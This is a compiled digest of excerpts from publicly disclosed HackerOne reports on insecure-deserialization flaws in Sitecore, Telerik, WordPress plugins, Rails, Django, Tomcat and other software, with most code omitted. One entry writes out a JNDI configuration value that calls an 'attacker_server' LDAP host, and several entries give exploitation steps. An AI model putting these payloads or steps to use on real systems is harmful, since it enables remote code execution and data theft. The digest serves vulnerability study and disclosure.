# HackerOne 实战案例：deserialization-of-untrusted-data

_30 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## insecure deserilize object leads to RCE On Sitecore (CVE-██████████-27218)
- 等级：Critical | 项目：Mars | 披露：2025-05-12 | CVE：CVE-2025-27218
- 原文：https://hackerone.com/reports/3090123

- - - - - - - - 
This critical vulnerability involves an insecure deserialization issue in Sitecore implementation on ██████████ , which has been assigned CVE-2025-27218. The vulnerability allows remote code execution (RCE) through unsanitized user input in the ThumbnailsAccessToken header. Using the BinaryFormatter serialization method, an attacker can create malicious serialized objects with tools like ysoserial.net and execute arbitrary operating system commands on the target server. This poses a severe security risk as it allows complete system compromise, where attackers can create, read, and exfiltrate files, potentially gaining full control of the affected system. The vulnerability ha


## RCE on Wordpress website
- 等级：Critical | 项目：Nextcloud | 披露：2023-12-28 | CVE：-
- 原文：https://hackerone.com/reports/2248328

- - - - - - - - 
There is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input.
# Proof of concept
The following command will execute the `system('id')` command on the host. As gadget chain I've used Monolog which is included in the PodLove WordPress plugin used on nextcloud.com: 
[code omitted]
The last line of the response will contain the output of the `id` command:
[code omitted]
# Vulnerable lines of code
The `unserialize` call in the below code paths is performed on user-input. (`$_COOKIE['nc_form_fields']`)
https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114
[code omitted]
https://git


## SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai
- 等级：Critical | 项目：Krisp | 披露：2023-02-22 | CVE：-
- 原文：https://hackerone.com/reports/1842674

- - - - - - - - 
[tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to **UNAUTHENTICATED** SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - [here](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/tenweb-speed-optimizer/10web-booster-website-speed-optimization-cache-page-speed-optimizer-21223-authenticated-sql-injection).
We would like to thank @mikemyers for reporting it r


## Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration
- 等级：Critical | 项目：Aiven | 披露：2022-11-08 | CVE：-
- 原文：https://hackerone.com/reports/1529790

- - - - - - - - 
## Summary:
When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too.  By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on th


## Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)
- 等级：Critical | 项目：U.S. | 披露：2021-06-03 | CVE：CVE-2017-11317,
- 原文：https://hackerone.com/reports/1174185

- - - - - - - - 
**Description:**
https://██████/██████████/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.
## References
https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui
## Impact
An attacker can execute code on the vulnerable server, allowing an attacker to gain a foothold and exfiltrate data. Depending on the security posture of the underlying system, an attacker may be able to escalate privileges or laterally move to other systems within the network using this access.
## System Host(s)
████
## Affected P


## Unsafe deserialization in Nexus Repository helm plugin
- 等级：Critical | 项目：Central | 披露：2020-09-10 | CVE：CVE-2020-15871
- 原文：https://hackerone.com/reports/917843

- - - - - - - - 
A remote code execution vulnerability (CVE-2020-15871) has been discovered in Nexus Repository Manager 3.
A user with the right permissions can run arbitrary code as the user running the Nexus Repository Manager server. Alternatively, an attacker could trick a user with the right permissions into running arbitrary code as the user running the Nexus Repository Manager server. We have fixed the issue so that the remote code execution is no longer possible. This advisory provides the pertinent information needed to properly address this vulnerability, along with the details on how to reach us if you have any further questions or concerns.
This vulnerability was identified by an


## Remote Code Execution via CVE-2019-18935
- 等级：Critical | 项目：U.S. | 披露：2020-08-13 | CVE：CVE-2017-11317,
- 原文：https://hackerone.com/reports/913695

- - - - - - - - 
**Summary:**
The website at https://█████████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.
## Step-by-step Reproduction Instructions
1. Browse to https://█████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau. You will see the following message confirming that the file upload handler is registered:
`{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." }`
2. From here on out I used the write-up at https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote


## Remote Code Execution via Insecure Deserialization in Telerik UI
- 等级：Critical | 项目：U.S. | 披露：2020-05-07 | CVE：CVE-2017-11317,
- 原文：https://hackerone.com/reports/838196

- - - - - - - - 
Hello,
I found an outdated version of Telerik Web UI (v2016.2.607.40) at the following URL: https://███/Telerik.Web.UI.WebResource.axd?type=rau.
This means that we can achieve full RCE by chaining two different CVEs: CVE-2017-11317, which allows us to upload arbitrary files on the server, and CVE-2019-18935, which is a deserialization vulnerability.
First of all, the only thing that I tried to prove that I had successfully achieved code execution was making the server sleep for 10 seconds.
No data was compromised.
Steps to reproduce
---------------------
The steps that I followed are thoroughly described in this blog post: <https://know.bishopfox.com/research/cve-2019-18935-


## Remote Code Execution (RCE) in a DoD website
- 等级：Critical | 项目：U.S. | 披露：2019-10-08 | CVE：CVE-2017-10366
- 原文：https://hackerone.com/reports/329376

- - - - - - - - 
SUMMARY:
====================
The DoD **`https://██████/psc/EXPROD_1/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].
PROOF OF CONCEPT
====================
For PoC I sent a special serialized java object in order to force th


## Remote Code Execution (RCE) in a DoD website
- 等级：Critical | 项目：U.S. | 披露：2019-10-08 | CVE：CVE-2017-10366
- 原文：https://hackerone.com/reports/329399

- - - - - - - - 
SUMMARY:
====================
The DoD **`https://███/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].
PROOF OF CONCEPT
====================
For PoC I sent a special serialized java object in order to force the vul


## Remote Code Execution (RCE) in a DoD website
- 等级：Critical | 项目：U.S. | 披露：2019-10-08 | CVE：CVE-2017-10366
- 原文：https://hackerone.com/reports/329400

- - - - - - - - 
SUMMARY:
====================
This report describes a vulnerability similar to that described in my other reports #329376, #329397, #329399
The DoD **`https://████/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].



## 2 vulnerabilities of arbitrary code in ████████  - CVE-2017-5929
- 等级：Critical | 项目：U.S. | 披露：2019-10-08 | CVE：CVE-2017-5929
- 原文：https://hackerone.com/reports/272979

- - - - - - - - 
**Summary:**
GitHub repo: https://github.com/████████
QOS.ch Logback before 1.2.0 has a serialization vulnerability affecting the SocketServer and ServerSocketReceiver components. 
High Severity
Arbitrary Code Execution
Vulnerable module: ch.qos.logback:logback-core 
Introduced through: com.github.dblock.waffle:waffle-distro@1.8.1 
Detailed paths
Introduced through: ███@█████████#a746bb4ecce1cb252a301c08be0daffa480c9747 › com.github.dblock.waffle:waffle-distro@1.8.1 › ch.qos.logback:logback-core@1.1.3
Introduced through: ██████@███#a746bb4ecce1cb252a301c08be0daffa480c9747 › com.github.dblock.waffle:waffle-distro@1.8.1 › ch.qos.logback:logback-classic@1.1.3 › ch.qos.logback:l


## Attacker can add arbitrary data to the blockchain without paying gas
- 等级：Critical | 项目：Rootstock | 披露：2019-09-18 | CVE：-
- 原文：https://hackerone.com/reports/396954

- - - - - - - - 
**Summary:**
Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.
**Description:**
The issue stems from the Transaction::rlpParse function:
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242
Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure tha


## Remote Code Execution through Deserialization Attack in OwnBackup app.
- 等级：Critical | 项目：ownCloud | 披露：2019-07-01 | CVE：-
- 原文：https://hackerone.com/reports/562335

- - - - - - - - 
I found a deserialization vulnerability in the [OwnBackup](https://marketplace.owncloud.com/apps/ownbackup) app, this vulnerability allows to execute remote code in the server. 
An administrator user could install the vulnerable app, or take advantage of this vulnerability if the **OwnBackup** application is installed.
Below are the steps to properly exploit the deserialization vulnerability.
**Step 1:** Login in the Owncloud application as an administrator user.
**Step 2:** Install the **OwnBackup** app from the Marketplace.
**Step 3:** Go to **Files** and upload the following files to the server.
* **structure.xml**
[code omitted]
* **data.dump**
[code omitted]
**Step 4:**


## Deserialization of Untrusted Data in www/delivery/adxmlrpc.php
- 等级：Critical | 项目：Revive | 披露：2019-04-23 | CVE：-
- 原文：https://hackerone.com/reports/512076

- - - - - - - - 
An attacker could send a specifically crafted payload to the XML-RPC invocation script and trigger the unserialize() call on the "what" parameter in the "openads.spc" RPC method.
## Impact
Such vulnerability could be used to perform various types of attacks, e.g. exploit serialize-related PHP vulnerabilities or PHP object injection.
It is possible, although unconfirmed, that the vulnerability has been used by some attackers in order to gain access to some Revive Adserver instances and deliver malware through them to third party websites.
---


## Deserialization of Untrusted Data in www/delivery/dxmlrpc.php
- 等级：Critical | 项目：Revive | 披露：2019-04-23 | CVE：-
- 原文：https://hackerone.com/reports/542670

- - - - - - - - 
An attacker could send a specifically crafted payload to the XML-RPC invocation script and trigger the unserialize() call on the first parameter in the "pluginExecute" RPC method.
## Impact
Such vulnerability could be used to perform various types of attacks, e.g. exploit serialize-related PHP vulnerabilities or PHP object injection.
---


## Remote Code Execution (RCE) in a Sony WebSystem
- 等级：Critical | 项目：Sony | 披露：2019-01-23 | CVE：-
- 原文：https://hackerone.com/reports/329572

- - - - - - - - 
⠀
---


## Remote Code Execution (RCE) in a Sony Pictures WebSystem
- 等级：Critical | 项目：Sony | 披露：2019-01-23 | CVE：-
- 原文：https://hackerone.com/reports/330028

- - - - - - - - 
⠀
---


## CTF Writeup flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}
- 等级：Critical | 项目：h1-5411-CTF | 披露：2018-11-21 | CVE：-
- 原文：https://hackerone.com/reports/415275

- - - - - - - - 
We have attached the writeup, the CTF was solved by me and Chapuka.
We would like to publish our writeup for the CTF in our blog, when can we do that?
It was a great CTF, it's a shame we are not @Buenos Aires right now :/
## Impact
.
---


## Remote Code Execution (RCE) in a DoD website
- 等级：Critical | 项目：U.S. | 披露：2018-04-17 | CVE：CVE-2017-10366
- 原文：https://hackerone.com/reports/329397

- - - - - - - - 
An application deserialization vulnerability was found in a misconfigured Department of Defense (DoD) website by @joaomatosf via POST/GET request. Impressive work. This showcases your skills!
Thank you for supporting the DoD Vulnerability Disclosure Program!
---


## Remote code execution on rubygems.org
- 等级：Critical | 项目：RubyGems | 披露：2017-11-09 | CVE：CVE-2017-0903
- 原文：https://hackerone.com/reports/274990

- - - - - - - - 
When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use `Psych.safe_load` set from `config/initializers/forbidden_yaml.rb`.
However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data. From there, 


## Two click Account Takeover
- 等级：High | 项目：Basecamp | 披露：2025-11-11 | CVE：-
- 原文：https://hackerone.com/reports/3079738

- - - - - - - - 
This report concerns the HEY Email Android application (com.basecamp.hey), which allows for a two-click account takeover. Due to improper handling of incoming deeplinks, the application can be manipulated to send the user's Authorization Bearer token to an attacker-controlled server if the attacker can trick the user into clicking a link and then performing an Undo action. The vulnerability specifically occurs in the `MainActivity` component when processing deeplinks with URL extras containing specific query parameters.
---


## CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet
- 等级：High | 项目：Internet | 披露：2025-04-27 | CVE：CVE-2025-24813
- 原文：https://hackerone.com/reports/3031518

- - - - - - - - 
I am sw0rd1ight.I found an Apache Tomcat RCE vulnerability in tomcat 9.0.98. 
If all of the following were true, a malicious user was able to perform remote code execution:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- application was using Tomcat's file based session persistence with the default storage location
- application included a library that may be leveraged in a deserialization attack
I reported this vulnerability through the official Apache Tomcat security email and received a fix along with a CVE number CVE-2025-24813.
this is screenshot of email and ASF response email I submitted.
{F4134453}
{F413


## CVE-2023-46132
- 等级：High | 项目：Linux | 披露：2024-01-08 | CVE：CVE-2023-46132
- 原文：https://hackerone.com/reports/2255968

- - - - - - - - 
# Long summary
In order to create a signature on a big chunk of data  such as a block, the data needs to be "compressed" first to the input size of the signature algorithm.
In Fabric's case, we use a hash function which compressed a Fabric block from arbitrary size to a 32 byte string.
 
In order to understand the problem we need to be more specific: The block structure has three parts to it: (1) Header, (2) Transactions, and (3) Metadata.
When hashing the block, the header and metadata are stitched together and then hashed, and this hash of the header and the metadata is what signed (it's a simplification but let's not get into details)
However, the transactions of the bloc


## Unexpected deserialization in Kredis
- 等级：High | 项目：Ruby | 披露：2023-08-16 | CVE：CVE-2023-27531
- 原文：https://hackerone.com/reports/1702859

- - - - - - - - 
Unexpected classes may be deserialized because `JSON.load` is used to cast json in [Kredis](https://github.com/rails/kredis).
https://github.com/rails/kredis/blob/v1.3.0/lib/kredis/type/json.rb
[code omitted]


## XMLRPC does not limit deserializable classes.
- 等级：High | 项目：Ruby | 披露：2023-08-01 | CVE：-
- 原文：https://hackerone.com/reports/1189419

- - - - - - - - 
I confirmed that the classes that can be generated by parsing the xml sent in the request or response by XMLRPC bundled in ruby are not restricted.
https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/create.rb#L251
[code omitted]
When converting parameters to XML,  limited to those that include `XMLRPC::Marshallable`.
https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/parser.rb#L104
[code omitted]
However, there are no class restrictions when parsing.
https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/config.rb#L27
[code omitted]
`Config::ENABLE_MARSHALLING` is true by default so there is no limit to the classes that can be restored.
---
## PoC


## Deserialization of potentially malicious data to RCE
- 等级：High | 项目：Django | 披露：2022-01-14 | CVE：CVE-2021-33026
- 原文：https://hackerone.com/reports/1415436

- - - - - - - - 
Hello, Django Team! It's my first time working with you, hope it will be great!
Note: I have not seen this issue neither in known vulnerabilities nor in documentation, so here I am.
## Summary
Several type of caches in https://github.com/django/django/tree/main/django/core/cache/backends use python `pickle` which may result in RCE (basically privilege escalation) in case attacker will takeover a machine/container with cache.
So, 4 types of cache use `pickle.load` directly or under the hood:
1. Locmem - I don't consider it as a big issue, because locmem uses some random part of memory for cache taken by Python while the server runs + it is unlikely to be used in production.
2


## Arbitrary File delete via PHAR deserialization
- 等级：High | 项目：Concrete | 披露：2021-10-20 | CVE：CVE-2021-40102
- 原文：https://hackerone.com/reports/921288

- - - - - - - - 
crayons :)


## Untrusted strings that are cache fetched with raw option are automatically marshal loaded
- 等级：High | 项目：Ruby | 披露：2020-05-26 | CVE：CVE-2020-8165
- 原文：https://hackerone.com/reports/413388

- - - - - - - - 
This vulnerability effects application code that caches a string from an untrusted source using the `raw: true` option. For example, vulnerable application code might looks something like the following
[code omitted]
where `res.body` represents the untrusted string in the example above.  The below script shows that an untrusted string in the Marshal format will be deserialized when read using `raw: true`.
[code omitted]
This vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.
The vulnerability affects both


## Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce
- 等级：High | 项目：Automattic | 披露：2019-12-19 | CVE：-
- 原文：https://hackerone.com/reports/403083

- - - - - - - - 
This vulnerability is based on the following exploitation technique:
https://blog.ripstech.com/2018/new-php-exploitation-technique/
It is easier to explain this vulnerability by having watched the PoC first:
https://www.youtube.com/watch?v=mr3bAOIUwd4
Here is what's happening:
1. Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader
2. I begin the Import process with a valid CSV file
3.  The importer asks if I am sure that I want to run the import on these files
4. I confirm and modify the  POST parameter to my phar:// wrapper and deserialize the file
5. The PHP code executes
The source of the vul

